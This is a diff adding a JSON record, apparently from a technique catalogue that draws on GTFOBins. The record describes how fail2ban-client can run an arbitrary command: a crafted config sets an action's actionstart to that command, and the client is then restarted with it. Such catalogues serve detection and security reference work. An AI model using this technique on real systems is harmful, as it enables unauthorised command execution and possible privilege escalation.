@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-fail2ban-client-command-2",
+  "name": "GTFOBins · fail2ban-client (command) #2",
+  "command": "cat >/path/to/temp-dir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/path/to/temp-dir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /path/to/temp-dir/action.d/\ncat >/path/to/temp-dir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /path/to/command\nEOF\n\nmkdir -p /path/to/temp-dir/filter.d/\ncat >/path/to/temp-dir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /path/to/temp-dir/ -v restart",
+  "description": "Use fail2ban-client to command via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "fail2ban-client",
+    "command"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/fail2ban-client/#command",
+  "upstream_id": "fail2ban-client/command/1",
+  "category": "gtfobins",
+  "subcategory": "command",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/fail2ban-client/"
+    }
+  ]
+}
